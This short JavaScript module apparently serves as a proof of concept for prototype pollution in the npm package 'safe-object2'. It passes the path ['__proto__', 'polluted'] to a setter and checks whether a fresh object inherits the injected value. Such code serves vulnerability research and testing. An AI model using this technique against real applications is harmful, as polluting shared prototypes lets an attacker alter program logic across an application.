function exploitFunction(payload) {
    const safeObj2 = require("safe-object2");
    const obj = safeObj2({});

    payload.setter(["__proto__", "polluted"], "yes");

    return obj.polluted;
}

module.exports = { exploitFunction };